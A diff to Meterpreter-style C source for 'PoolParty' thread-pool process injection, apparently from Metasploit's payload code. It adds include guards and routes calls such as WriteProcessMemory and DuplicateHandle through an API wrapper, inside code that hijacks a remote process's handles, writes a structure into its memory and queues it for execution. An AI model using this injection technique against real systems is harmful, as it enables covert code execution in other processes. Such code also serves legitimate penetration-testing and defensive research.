@@ -1,8 +1,9 @@
+#ifndef _METERPRETER_POOLPARTY_C
+#define _METERPRETER_POOLPARTY_C
+#include "pool_party_ext.h"
 #include "common.h"
 #include "common_metapi.h"
 #include "pool_party.h"
-#include "pool_party_ext.h"
-
 NtDll *pNtDll = NULL;
 POOLPARTY_INJECTOR* poolLifeguard = NULL;
 
@@ -23,7 +24,7 @@ NtDll* GetOrInitNtDll() {
 		HMODULE hNtDll = NULL;
 		hNtDll = GetModuleHandleA("ntdll.dll");
 		if(!hNtDll) {
-			hNtDll = LoadLibraryA("ntdll.dll");
+			hNtDll = met_api->win_api.kernel32.LoadLibraryA("ntdll.dll");
 			bError = hNtDll == NULL;
 			if(bError) {
 				break;
@@ -181,14 +182,14 @@ HANDLE GetRemoteHandle(HANDLE hProcess, LPCWSTR typeName, DWORD dwDesiredAccess)
 	lpObjectInfo = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwInformationSizeIn);
 	dprintf("[INJECT][inject_via_poolparty][get_remote_handle] lpObjectInfo: %p", lpObjectInfo);
 	for (ULONG i = 0; i < lpProcessInfo->NumberOfHandles; i++) {
-		if (DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
+		if (met_api->win_api.kernel32.DuplicateHandle(hProcess, lpProcessInfo->Handles[i].HandleValue, hCurrProcess, &hHijackHandle, dwDesiredAccess, FALSE, 0)) {
 			pNtDll->pNtQueryObject(hHijackHandle, ObjectTypeInformation, lpObjectInfo, dwInformationSizeIn, &dwInformationSizeOut);
 			if (dwInformationSizeIn > dwInformationSizeOut) {
 				if (lstrcmpW(typeName, lpObjectInfo->TypeName.Buffer) == 0) {
 					break;
 				}
 			}
-			CloseHandle(hHijackHandle);
+			met_api->win_api.kernel32.CloseHandle(hHijackHandle);
 		}
 		hHijackHandle = INVALID_HANDLE_VALUE;
 	}
@@ -234,7 +235,7 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 			if (!RemoteDirectAddress) {
 				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_NOT_SUPPORTED)
 			}
-			if (!WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
+			if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, RemoteDirectAddress, lpDirect, TP_DIRECT_STRUCT_SIZE_X64, NULL)) {
 				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to write target process memory.", ERROR_NOT_SUPPORTED)
 			}
 			dwResult = pNtDll->pZwSetIoCompletion(hHijackHandle, RemoteDirectAddress, lpParameter, 0, 0);
@@ -323,4 +324,4 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 //	return dwResult;
 //}
 //
-
+#endif
